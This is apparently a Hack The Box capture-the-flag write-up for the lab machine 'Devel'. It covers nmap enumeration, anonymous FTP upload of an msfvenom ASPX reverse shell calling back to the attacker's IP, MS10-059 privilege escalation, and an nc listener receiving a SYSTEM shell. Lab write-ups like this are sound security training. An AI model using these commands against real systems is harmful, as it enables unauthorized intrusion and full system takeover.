Hi, lets get stuck in...

Im settling on a good 'less intrusive' nmap command to start enumeration of a machine with...

`nmap -sV -Pn --min-rate 10000 -p- 10.10.10.5 |tee -a dev.txt`

Often depending on the results, ill run `-sC` or `--script=vuln` either on specific ports, or the default range.

```

Nmap scan report for 10.10.10.5
Host is up (0.092s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

In this case, its not really necessary, we can just manually test the target's ftp port to see if it will allow anonymous login.

`ftp 10.10.10.5` then use the username `anonymous` with any password like `aosdidhf`, and we got access.

A test to upload random text.txt file is successful, so we can potentially upload a reverse-shell of some sort to get a command shell on the target.

############################

The website on port 80 displays the Welcome page we found in the ftp directory...
The target is running an aspnet client, which means if we upload an evil.aspx file, we can browse to it on port 80 to trigger it.

So lets first use MSFvenom to craft an evil.aspx reverse-shell file...
`msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.19 lport=443 -f aspx -o evil.aspx`

Next we `put` the file onto the target via the ftp service.

```

```

in main ftp (root directory) `put evil.aspx`


Now just browse to `http://10.10.10.5/evil.aspx` to execute.

So we got a windows cli shell, and we need to escalate our privilages to get ntauthority/system to enable us to read root.txt in the Administrator's Desktop.

Now's a handy time to get familiarized with `windows-exploit-suggester.py`. 

First we need to do is run the command `systeminfo` then copy'n'paste the results onto our kali machine
into a text-file, in this case called sysinfo.txt.

```

Read the python program first for instructions ...

```

# USAGE
# 
# update the database
#
# $ ./windows-exploit-suggester.py --update
# [*] initiating...
# [*] successfully requested base url
# [*] scraped ms download url
# [+] writing to file 2014-06-06-mssb.xlsx
# [*] done

#
# (install python-xlrd, $ pip install xlrd --upgrade)
#
# feed it "systeminfo" input, and point it to the microsoft database
#
# $ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt

```

The result of following these instructions, is a list of potential methods of privilage escalation.

In this case we chose ms10-059 (chimichurri.exe)

Upload it again via ftp. Then transfer it to a place we can execute it.
I often create a directory in C: to work from (which I can remove later)
`mkdir c:\boo`

Before we execute the evil.exe, lets get a listener running on kali to catch the shell...
`nc -nlvp 999`

Then on the target run...
`c:\boo\evil.exe 10.10.14.19 999`


```

root@kali:~/HTB/retired/devel# nc -nlvp 999
listening on [any] 999 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.5] 49162
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\boo>whoami
whoami
nt authority\system

```

From here it is trivial to navigate to the user and Admin Desktops to get the user.txt.txt and root.txt.txt files.
read them with the `type` command.
eg.`type root.txt.txt`


The scenario is a simple one, but still encountered 'in the wild', and the widows-exploit-suggester.py' is definately a handy tool to have in your armoury.
